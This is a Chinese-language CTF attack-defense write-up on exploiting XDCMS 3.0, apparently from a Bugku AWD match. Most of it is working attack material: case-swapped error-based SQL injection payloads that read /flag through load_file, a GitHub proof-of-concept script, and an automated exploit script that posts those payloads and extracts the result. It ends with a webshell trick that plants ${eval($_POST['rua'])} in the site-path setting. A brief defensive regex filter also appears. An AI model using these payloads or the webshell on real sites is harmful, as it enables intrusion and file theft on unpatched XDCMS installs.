# bugkuAWD-18-xdcms

## sql注入

一开始上来没有🐎, 然后是xdcms 3.0, 主要围绕一个 sql 注入展开攻击

```php
function safe_html($str){
    if(empty($str)){return;}
    $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |%|=|\/*|*|\.\.\/|\.\/| union | from | where | group | into |load_file
|outfile/','',$str);
    return htmlspecialchars($str);
}
```

这个 waf 只过滤了函数但是没有考虑大小写, 导致过滤字符可通过大小写转换或双写进行绕过, mysql 给的是 root 权限, 主要是在 `index.php?m=xdcms&c=login&f=check` 这个路径攻击, 验证码需要每次刷新

```
username=ss' or upDatexml(1,concat(0x7e,select load_file('/flag')),1)#&password=admin&verifycode=bd3d&button=
username=ss' or upDatexml(1,concat(0x7e,select reverse(load_file('/flag'))),1)#&password=admin&verifycode=bd3d&button=
```

payload1

![20210605205757417](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210605205757417.png)

payload2

![20210605205818975](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210605205818975.png)

然后就是在友链的地方(`system/modules/link/admin.php`)也是调用的这个函数 safe_html()

### 预防方法

写个简单的waf防御

```php
$check=preg_match('/[\s]*(select|insert|update|delete)\s|\s(and|or|in|on|left|value|concat|join|like|regexp|where|union|into)\s|\#|\'|\\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile/i',$str);
    if ($check) {
        echo '<script language="JavaScript">alert("Warnning!!\r\n' . $str . ' is invalid.");</script>';
        exit();
    }
```

或者访问 `/admin` 直接重定向回原界面, 不让对方访问(只是能限制这个口)

或者开个监听(监听里面自带waf防御)

**github上的利用脚本**

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = LinE
#_PlugName_ = XDCMS SQL injection
#_Function_ = XDCMS SQL注射
#_FileName_ = XDCMS_SQL_injection.py


def assign(service, arg):
    if service == "xdcms":
        return True, arg


def audit(arg):
    import urllib
    target = "index.php?m=member&f=register_save"
    data = {
        "username": "sss' And 1 like(updAtexml(1,concat(0x5e24,(Select concat(md5(123),0x3a,0x3a)),0x5e24),1))#",
        "password": "123456",
        "password2": "123456",
        "fields[truename]": "",
        "fileds[email]": "",
        "submit": " ? ? "
    }
    payload = urllib.urlencode(data)

    code, head, res, errcode, _ = curl.curl('-d %s %s' % (payload, target))
    if code == 200 and "ac59075b964b0715" in res:
            security_hole(_)


def getString(String):
    import re
    Temp = re.search("(?<=<h2>).+(?=</h2>)", String).group(0)
    return Temp

if __name__ == '__main__':
    from dummy import *
    audit(assign('xdcms', 'http://www.example.com')[1])
```

**夜师傅的脚本(针对bugku框架写的)**

```python
class Payload(object):
    challenge = 'web1'  # only send payload to challenge with this challenge
    once = True  # TODO

    @staticmethod
    def run(ip: str) -> str:
        """
        send the payload to ``ip`` and return the text which contains flag
        :param ip:
        :return:
        """
        import requests
        import re
        session = requests.session()

        burp0_url = f"http://{ip}/index.php?m=member&f=login_save"
        burp0_cookies = {"PHPSESSID": "mdl8f38vkvnmdm6eokcm7l9573"}
        burp0_headers = {"POST http": "/192-168-1-131.awd.bugku.cn/index.php?m=member&f=login_save HTTP/1.1",
                         "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                         "Origin": "http://192-168-1-131.awd.bugku.cn",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Referer": "http://192-168-1-131.awd.bugku.cn/index.php?m=member&f=register",
                         "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        burp0_data1 = {"username": "ss' or updatexml(1,concat(0x7e,select substr(load_file('/flag'),21,18),0x7e),1)#",
                       "password": "admin", "submit": " \xe7\x99\xbb \xe5\xbd\x95 "}
        burp0_data = {"username": "ss' or updatexml(1,concat(0x7e,select substr(load_file('/flag'),1,20),0x7e),1)#",
                      "password": "admin", "submit": " \xe7\x99\xbb \xe5\xbd\x95 "}

        res = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, timeout=2)
        res1 = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data1, timeout=2)
        shi = re.compile('~(.*?)~', re.S)
        flag1 = re.findall(shi, res.text)[0]
        flag2 = re.findall(shi, res1.text)[0]
        flag = flag1 + flag2
        # print(flag)
        return flags
```

## 后台后门利用

xdcms后台网站配置基本信息的网站路径处过滤不严，仍可以插一句话拿shell。

前提 magic_quotes_gpc=Off

进后台，在基本信息中的网站路径处添加一句话，因为尖括号被转码，但是可以添加花括号型的一句话，${eval($_POST['rua'])}。

 一句话写入在/system/xdcms.inc.php中。

**或者后台修改上传文件配置**

